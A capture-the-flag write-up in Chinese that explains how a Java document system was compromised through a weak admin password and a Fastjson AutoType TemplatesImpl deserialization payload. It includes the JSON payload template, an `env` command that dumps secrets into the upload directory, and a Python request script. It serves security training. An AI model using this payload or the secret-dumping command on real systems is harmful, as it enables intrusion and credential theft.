# NepCTF2026 文档编辑系统 Writeup

## 题目简述

目标是一个 Java 文档编辑系统。管理员账号使用弱口令，管理接口通过开启 AutoType 的旧版 Fastjson 反序列化 JSON，可以使用 `TemplatesImpl` 执行任意 Java 字节码。环境无法出网，因此需要把命令输出写入应用上传目录，再使用普通用户的文档预览接口读取。

## 解题过程

先尝试常见弱口令，管理员凭据为：

```text
admin / admin123
```

登录后抓取批量更新接口：

```text
POST /api/admin/doc/batchUpdate
Content-Type: application/json
Cookie: JSESSIONID=...
```

提交不完整 JSON 可观察 Fastjson 异常栈，再用：

```json
{
  "@type": "java.util.HashMap"
}
```

确认服务允许 AutoType。错误信息和行为表明版本不高于 1.2.47，可构造 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`：

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["<恶意 Translet 类的 Base64>"],
  "_name": "a.b",
  "_tfactory": {},
  "_outputProperties": {}
}
```

`_bytecodes` 不是任意命令字符串，而是继承 `AbstractTranslet` 的 Java class 字节码。类的静态初始化块或构造逻辑执行目标命令；访问 `_outputProperties` 时会促使 `TemplatesImpl` 定义并实例化 translet。

由于靶机不能反连，命令改为把环境变量写入 Web 应用允许读取的位置：

```bash
env > /app/upload/b.txt
```

生成对应 class 后，将 Base64 填入 payload，用管理员 `JSESSIONID` 发送到 `batchUpdate`。随后注册并登录普通用户；注册接口本身不会立即赋予当前会话完整用户角色，因此要再执行一次登录。最后请求：

```text
GET /api/doc/preview?file_path=b.txt
Cookie: JSESSIONID=<普通用户会话>
```

预览响应会返回 `/app/upload/b.txt`，从环境变量中找到 flag。

自动化时应维护管理员和普通用户两个独立 cookie jar：

```python
admin = HttpClient(base_url)
user = HttpClient(base_url)

admin.login("admin", "admin123")
user.register("A", "A")
user.login("A", "A")

admin.post_json("/api/admin/doc/batchUpdate", payload)
print(user.get("/api/doc/preview?file_path=b.txt"))
```

## 方法总结

本题包含三项缺陷：管理员弱口令、Fastjson AutoType 反序列化和上传目录可回读。不能出网并不等于命令执行无用，只要应用存在“可写路径 → 可读接口”的闭环，就能把命令结果落盘后取回。归档时应说明 `TemplatesImpl` 字节码的生成要求，而不是只留下一个无法解释或已损坏的 Base64 大串。
